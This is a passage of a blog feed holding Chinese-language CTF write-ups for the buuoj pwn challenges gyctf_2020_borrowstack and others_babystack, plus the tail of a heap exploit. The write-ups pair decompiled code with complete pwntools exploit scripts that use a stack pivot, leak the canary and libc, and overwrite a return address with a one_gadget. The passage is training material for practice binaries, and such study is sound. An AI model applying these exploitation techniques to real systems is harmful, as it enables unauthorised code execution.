io.recvuntil(<span class="string">&quot;Done !&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>,<span class="string">b&quot;aaaa&quot;</span>) <span class="comment">#0 </span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&quot;bbbb&quot;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&quot;cccc&quot;</span>) <span class="comment">#2</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;b&#x27;</span></span><br><span class="line">add(<span class="number">0x88</span>,payload) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;b&quot;</span>)</span><br><span class="line">main_arena = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_addr = main_arena - (<span class="number">0x7fa0ee626b78</span>-<span class="number">0x7fa0ee262000</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x88</span>)+<span class="string">b&quot;\x71&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x8</span>*<span class="number">10</span>)+p64(<span class="number">0x8</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">add(<span class="number">0x60</span>,payload) <span class="comment">#1</span></span><br><span class="line">gdb.attach(io)</span><br><span class="line"><span class="comment">#0x45216 0x4526a 0xf02a4 0xf1147</span></span><br><span class="line">onegadget_addr = libc_addr + <span class="number">0xf02a4</span></span><br><span class="line">edit(<span class="number">2</span>,p64(onegadget_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>gyctf_2020_borrowstack</title>
      <link href="/2022/12/18/gyctf-2020-borrowstack/"/>
      <url>/2022/12/18/gyctf-2020-borrowstack/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>一题栈迁移 但是有涉及到内存越界的问题 记录一下 防止以后踩坑</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)</span><br><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>ida打开看一下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">96</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aWelcomeToStack);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x70</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!You can check and use your borrow stack now!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;bank, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>buf局部变量 bank位于bss段</p><p>栈溢出的空间太少了 构造不了rop链 所以是想到把rop写到bank里面 然后栈迁移到对应位置</p><p>ps: 这里的逻辑关系得清楚一下 我们平时栈溢出覆盖返回地址 实际上利用main函数这个栈帧结束以后 会返回到父函数 覆盖了返回地址 所以哪怕我们先覆盖了返回地址 但是接下来程序并没有立刻结束 所以并不会影响我们修改bank的内容</p><p>此时exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">libcmath</span>(<span class="params">function_addr,function_name</span>):</span><br><span class="line">    libc_addr = function_addr - libc.sym[function_name]</span><br><span class="line">    system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">    <span class="keyword">return</span> system_addr,binsh_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr</span>):</span><br><span class="line">    payload = cyclic(offset)</span><br><span class="line">    payload += p64(gadget2_addr)</span><br><span class="line">    payload += cyclic(<span class="number">0x8</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(call_addr)</span><br><span class="line">    payload += p64(rdx)</span><br><span class="line">    payload += p64(rsi)</span><br><span class="line">    payload += p64(rdi)</span><br><span class="line">    payload += p64(gadget1_addr)</span><br><span class="line">    payload += cyclic(<span class="number">56</span>)</span><br><span class="line">    payload += p64(ret_addr)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">localconnect</span>(<span class="params">filename</span>):</span><br><span class="line">    io = process(filename)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remoteconnect</span>(<span class="params">ip,port</span>):</span><br><span class="line">    io = remote(ip,port)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">elf_libc</span>(<span class="params">filename,libc_name</span>):</span><br><span class="line">    elf = ELF(filename)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line">    <span class="keyword">return</span> elf,libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">button</span>):</span><br><span class="line">    <span class="keyword">if</span>(button==<span class="number">1</span>):</span><br><span class="line">        context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">libc_name = <span class="string">&#x27;buu_libc_ubuntu16_64&#x27;</span></span><br><span class="line">ip=<span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port=<span class="number">28099</span></span><br><span class="line">elf,libc = elf_libc(filename,libc_name)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remoteconnect(ip,port)</span></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">debug(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Ｗelcome to Stack bank,Tell me what you want&quot;</span>)</span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line">leave_addr = <span class="number">0x400699</span></span><br><span class="line">puts_plt = <span class="number">0x4004e0</span></span><br><span class="line">rdi_addr = <span class="number">0x400703</span></span><br><span class="line">ret_addr = <span class="number">0x4004c9</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload = cyclic(<span class="number">0x60</span>)+p64(bss_addr-<span class="number">0x8</span>)+p64(leave_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Done!You can check and use your borrow stack now!&quot;</span>)</span><br><span class="line">payload = p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure><p>但是发现行不通 gdb动调了一下发现 好像跳转到了奇怪的地方</p><p><a href="https://pic.imgdb.cn/item/639f21d6b1fccdcd36004b11.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/639f21d6b1fccdcd36004b11.png"></a></p><p>看了一下地址 好像是跑到了bss段上面的got表了 那有没有什么办法可以抬高栈(往低地址处抬高) 我们想到了ret指令 刚好可以读入0x100字节的数据在bank里面</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(ret_addr)*<span class="number">20</span>+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br></pre></td></tr></table></figure><p>接着就可以成功泄露puts的真实地址了</p><p>接下来两个办法 既然只能刚好覆盖到ret addr 那就直接覆盖成onegadget 因为libc基址已经知道了</p><p>或者重复上面的操作 按照常规的system进行系统调用  不过尝试了一下发现不行 也不清楚是什么原因</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">libcmath</span>(<span class="params">function_addr,function_name</span>):</span><br><span class="line">    libc_addr = function_addr - libc.sym[function_name]</span><br><span class="line">    system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">    <span class="keyword">return</span> system_addr,binsh_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr</span>):</span><br><span class="line">    payload = cyclic(offset)</span><br><span class="line">    payload += p64(gadget2_addr)</span><br><span class="line">    payload += cyclic(<span class="number">0x8</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(call_addr)</span><br><span class="line">    payload += p64(rdx)</span><br><span class="line">    payload += p64(rsi)</span><br><span class="line">    payload += p64(rdi)</span><br><span class="line">    payload += p64(gadget1_addr)</span><br><span class="line">    payload += cyclic(<span class="number">56</span>)</span><br><span class="line">    payload += p64(ret_addr)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">localconnect</span>(<span class="params">filename</span>):</span><br><span class="line">    io = process(filename)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remoteconnect</span>(<span class="params">ip,port</span>):</span><br><span class="line">    io = remote(ip,port)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">elf_libc</span>(<span class="params">filename,libc_name</span>):</span><br><span class="line">    elf = ELF(filename)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line">    <span class="keyword">return</span> elf,libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">button</span>):</span><br><span class="line">    <span class="keyword">if</span>(button==<span class="number">1</span>):</span><br><span class="line">        context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">libc_name = <span class="string">&#x27;buu_libc_ubuntu16_64&#x27;</span></span><br><span class="line">ip=<span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port=<span class="number">28099</span></span><br><span class="line">elf,libc = elf_libc(filename,libc_name)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remoteconnect(ip,port)</span></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">debug(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Ｗelcome to Stack bank,Tell me what you want&quot;</span>)</span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line">leave_addr = <span class="number">0x400699</span></span><br><span class="line">puts_plt = <span class="number">0x4004e0</span></span><br><span class="line">rdi_addr = <span class="number">0x400703</span></span><br><span class="line">ret_addr = <span class="number">0x4004c9</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">payload = cyclic(<span class="number">0x60</span>)+p64(bss_addr-<span class="number">0x8</span>)+p64(leave_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Done!You can check and use your borrow stack now!&quot;</span>)</span><br><span class="line">payload = p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_addr = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment">#0x45216 0x4526a 0xf02a4 0xf1147</span></span><br><span class="line">onegadget_addr = libc_addr+<span class="number">0x4526a</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Ｗelcome to Stack bank,Tell me what you want&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x68</span>)+p64(onegadget_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>others_babystack</title>
      <link href="/2022/12/16/others-babystack/"/>
      <url>/2022/12/16/others-babystack/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>一道蛮神奇的题 两种解法 不过一种有点非常规 不知道出题人怎么设置的</p><p>checksec看一下保护机制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)</span><br><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>ida查看一下main函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">136</span>]; <span class="comment">// [rsp+10h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v3 = choice();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        read(<span class="number">0</span>, s, <span class="number">0x100</span>uLL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        sendline(<span class="string">&quot;invalid choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sendline(&amp;unk_400AE7);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>menu函数这里就不放了 反正就看这些源码也能知道各个选项对应什么作用</p><p>两个比较重要的地方 有一个puts泄露的机会 还有read函数可以读入数据</p><p>考虑到程序开启了金丝雀 所以这里的puts可以用来泄露金丝雀</p><p>覆盖金丝雀的最后一位 使其不为\x00 因为puts或者printf截停一个字符串就是靠\x00</p><p>这里泄露的时候有个小坑 就是你不能想着读入后7位 然后最后用p64把他补全成八位 因为第八位也恒为00嘛</p><p>但是pwntools的p64补全是在首位补全</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./a.out&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">canary = <span class="number">0x11223344556677</span></span><br><span class="line">payload = p64(canary)</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure><p>如上程序 假设canary值为上述那样 我们debug看一下最后会输送什么样的数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[DEBUG] Sent 0x9 bytes:</span><br><span class="line">    00000000  77 66 55 44  33 22 11 00  0a                        │wfUD│3&quot;··│·│</span><br><span class="line">    00000009</span><br></pre></td></tr></table></figure><p>很明显 小端序存储 所以00实际上是被放在了首位</p><p>所以可以用sendline多出来的\n字节覆盖\x00 然后接收八个字节的数据 最后-0xa 就能得到带有00的canary</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">libcmath</span>(<span class="params">function_addr,function_name</span>):</span><br><span class="line">    libc_addr = function_addr - libc.sym[function_name]</span><br><span class="line">    system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> system_addr,binsh_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr</span>):</span><br><span class="line">    payload = cyclic(offset)</span><br><span class="line">    payload += p64(gadget2_addr)</span><br><span class="line">    payload += cyclic(<span class="number">0x8</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(call_addr)</span><br><span class="line">    payload += p64(rdx)</span><br><span class="line">    payload += p64(rsi)</span><br><span class="line">    payload += p64(rdi)</span><br><span class="line">    payload += p64(gadget1_addr)</span><br><span class="line">    payload += cyclic(<span class="number">56</span>)</span><br><span class="line">    payload += p64(ret_addr)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">localconnect</span>(<span class="params">filename</span>):</span><br><span class="line">    io = process(filename)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remoteconnect</span>(<span class="params">ip,port</span>):</span><br><span class="line">    io = remote(ip,port)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">elf_libc</span>(<span class="params">filename,libc_name</span>):</span><br><span class="line">    elf = ELF(filename)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line">    <span class="keyword">return</span> elf,libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">button</span>):</span><br><span class="line">    <span class="keyword">if</span>(button==<span class="number">1</span>):</span><br><span class="line">        context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;pwn&#x27;</span></span><br><span class="line">libc_name = <span class="string">&#x27;buu_libc_ubuntu16_64&#x27;</span></span><br><span class="line">ip=<span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port=<span class="number">29125</span></span><br><span class="line">elf,libc = elf_libc(filename,libc_name)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line">main_addr = <span class="number">0x400908</span></span><br><span class="line"></span><br><span class="line">io = remoteconnect(ip,port)</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">debug(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = <span class="number">0x400690</span></span><br><span class="line">rdi_addr = <span class="number">0x400a93</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">leave_addr = <span class="number">0x400824</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x87</span>)+<span class="string">b&quot;1&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0xa</span></span><br></pre></td></tr></table></figure><p>接下来还要想办法控制程序执行流 一开始看到read只能读入0x100的数据 我是觉得不能构造rop链来泄露libc基址</p><p>但是最后查看wp的时候 发现大家都是用泄露基址的办法做的 也是比较神奇 数据竟然能超出限制读入</p><p>第一种办法用到的是泄露__libc_start_main函数的地址</p><p>稍微了解一下程序函数调用就会知道 main函数并不是程序第一个调用的</p><p>__libc_start_main函数的地址应该是在rbp的下一个字长处</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x98</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.recv(<span class="number">0x98</span>)</span><br><span class="line">start_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_addr = start_addr - <span class="number">240</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>这里泄露出来的start_addr之所以要减去240 还得要动调来看</p><p><a href="https://pic.imgdb.cn/item/639c6c9fb1fccdcd36ad97f4.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/639c6c9fb1fccdcd36ad97f4.png"></a></p><p>泄露出来的地址距离__libc_start_main函数还有231偏移 当然这只是本地libc的偏移 远程的等下还得微调一下</p><p>此时我们得到算式:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libc_addr = start_addr - 231 - libc.sym[&#x27;__libc_start_main&#x27;]</span><br></pre></td></tr></table></figure><p>在本地上 其后三位是000 但是远程环境不同 运行看一下差了多少</p><p>得到的值是0x7f3fea3e8009 多了9 那就减去240就可以得到远程的libc基址了</p><p>虽然我们得到了libc基址 但是由于read可以溢出的长度不够我们构造一个system链 所以这里采取修改ret addr为one_gadget</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">libcmath</span>(<span class="params">function_addr,function_name</span>):</span><br><span class="line">    libc_addr = function_addr - libc.sym[function_name]</span><br><span class="line">    system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> system_addr,binsh_addr</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">offset,gadget2_addr,call_addr,rdx,rsi,rdi,gadget1_addr,ret_addr</span>):</span><br><span class="line">    payload = cyclic(offset)</span><br><span class="line">    payload += p64(gadget2_addr)</span><br><span class="line">    payload += cyclic(<span class="number">0x8</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(<span class="number">1</span>)</span><br><span class="line">    payload += p64(call_addr)</span><br><span class="line">    payload += p64(rdx)</span><br><span class="line">    payload += p64(rsi)</span><br><span class="line">    payload += p64(rdi)</span><br><span class="line">    payload += p64(gadget1_addr)</span><br><span class="line">    payload += cyclic(<span class="number">56</span>)</span><br><span class="line">    payload += p64(ret_addr)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">localconnect</span>(<span class="params">filename</span>):</span><br><span class="line">    io = process(filename)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remoteconnect</span>(<span class="params">ip,port</span>):</span><br><span class="line">    io = remote(ip,port)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">elf_libc</span>(<span class="params">filename,libc_name</span>):</span><br><span class="line">    elf = ELF(filename)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line">    <span class="keyword">return</span> elf,libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span 